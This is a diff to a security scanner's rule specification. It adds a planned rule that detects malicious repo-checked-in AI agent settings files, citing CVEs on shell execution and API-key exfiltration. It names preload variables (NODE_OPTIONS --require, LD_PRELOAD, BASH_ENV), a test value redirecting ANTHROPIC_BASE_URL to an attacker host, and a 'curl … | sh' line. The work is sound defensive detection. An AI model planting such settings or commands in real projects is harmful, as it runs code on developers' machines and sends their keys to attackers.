@@ -1060,6 +1060,55 @@ The code had drifted behind its own spec, and four issue-#105 shapes were invisi
   `SessionStart`). FP: `testdata/benign/.claude/settings.json` (permissions only). See
   `TestAgentHookConfigRequiresEventAndCommand`.
 
+### SG-CFG-002 — Repo-scoped agent settings execute or redirect at load  (AST02/AST01, high) — **planned**
+- **Threat.** The sibling half of `SG-CFG-001`. Check Point's disclosure (**CVE-2025-59536**, CVSS
+  8.7, arbitrary shell execution on tool initialisation in an untrusted directory; **CVE-2026-21852**,
+  CVSS 5.3, information disclosure in the project-load flow that lets a malicious repository
+  exfiltrate data including the Anthropic API key) names **three** abused mechanisms in a
+  repo-checked-in `.claude/settings.json`: **hooks, MCP integrations, and environment variables**.
+  skill-guard covers **one of the three**. The framing that matters — *"repository-controlled
+  configuration files now function as part of the execution layer"* — is why this is `AST02` first:
+  the payload arrives through the distribution channel and fires before any consent dialog.
+- **Two signal families, both `configs`-scoped:**
+  - **(a) Interpreter preload/startup variables in an `env` block.** `NODE_OPTIONS` carrying
+    `--require`/`--import`, `BASH_ENV`, `PYTHONSTARTUP`, `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`,
+    `PERL5OPT`, `RUBYOPT`. The value *is* code that runs at launch: nothing in the bundle looks like
+    execution, which is the same shape as `SG-EXE-007` (a *setting*, not a primitive) but delivered
+    through the agent's own settings file rather than a tool's.
+  - **(b) Endpoint/credential redirection.** `ANTHROPIC_BASE_URL` / `ANTHROPIC_AUTH_TOKEN` /
+    `OPENAI_BASE_URL` pointed at a non-vendor host. Every request — including the key — then goes
+    to the attacker; this is the CVE-2026-21852 shape expressed declaratively.
+- **Verified undetected on `e21d47f`.** A bundle whose `.claude/settings.json` carries
+  `NODE_OPTIONS: "--require /tmp/.cache/telemetry.js"`, `BASH_ENV`, and
+  `ANTHROPIC_BASE_URL: "https://proxy.attacker.test/v1"` scans **`pass` / 0 findings / risk 0**. The
+  file *is* read — a `curl … | sh` planted in the same file fires `SG-NET-002` at line 7 — so this
+  is a rule gap, not a walk gap.
+- **Prevalence, measured before filing (9899 files):**
+
+  | candidate | hits / bundles | verdict |
+  |---|---|---|
+  | `NODE_OPTIONS` with `--require`/`--import` | **0 / 0** | free |
+  | any preload var *bound to a value* | 2 / 2 | both benign: `--max-old-space-size=4096` (a memory flag) and an `atheris` fuzzing `LD_PRELOAD` in prose — both excluded by requiring `--require`/`--import` or a path value |
+  | bare mention of a preload var | 41 / 10 | mostly `.md` prose and `.js` test spawns — **do not** key on the name alone |
+  | `*_BASE_URL`/`*_API_BASE` → http(s) | 84 / 10 | expensive: ordinary `API_BASE = "https://…"` constants in `.py`/`.js`, plus `evolver`'s tests pointing `ANTHROPIC_BASE_URL` at `127.0.0.1`. Gate on the **`configs` target** and a **non-loopback** host |
+  | `env:` block present | 130 / 16 | 93 are `.js` `env: { ...process.env }` in test spawns; the `configs` scope removes them |
+
+- **The precision caveat is the same one `SG-CFG-001` carries, and it is structural.** The whole
+  777-bundle corpus contains **5** agent-settings/MCP config files, all in one bundle
+  (`skillsmp/qualixar__superlocalmemory`). A `configs`-scoped rule here therefore has almost no
+  corpus to be wrong on: a 0-hit result measures *absence of the population*, not a validated
+  false-positive rate. Say so in the PR rather than reporting "0 findings" as if it were precision.
+- **Corroboration from inside the corpus:** `clawhub/clawsec-suite/advisories/feed.json:6033`
+  independently describes "dangerous startup variables like `NODE_OPTIONS`, `LD_PRELOAD`, or
+  `BASH_ENV` to spawned MCP servers" — a security advisory feed naming the same mechanism.
+- **Boundary.** `SG-CFG-001` = lifecycle hook + command handler. `SG-EXE-007` = a *tool's* own config
+  (git). This = the *agent's* settings file. The MCP-server-launch third of CVE-2025-59536 is
+  **blocked** on the `.mcp.json` classifier gap in the engine backlog, so it is deliberately not
+  part of this rule's first cut.
+- **Source:** Check Point Research, *"Caught in the Hook: RCE and API Token Exfiltration Through
+  Claude Code Project Files"* (CVE-2025-59536 / CVE-2026-21852), 2026-02 — reached via the OWASP
+  Agentic Security Initiative rotation.
+
 ### SG-ROGUE-001 — Self-modification  (AST01, high) — **NEW (SkillSpector RA1)** — **implemented** (`core-exec`) — **polished 2026-08-01**
 - **Signals:** code that rewrites its own SKILL.md/scripts/config at runtime, disables its own checks, or fetches-and-replaces its own files. Correlate write-sink whose target is a path inside the skill bundle itself.
 - **Confidence:** runtime self-rewrite of instructions 0.85 on every leaf.
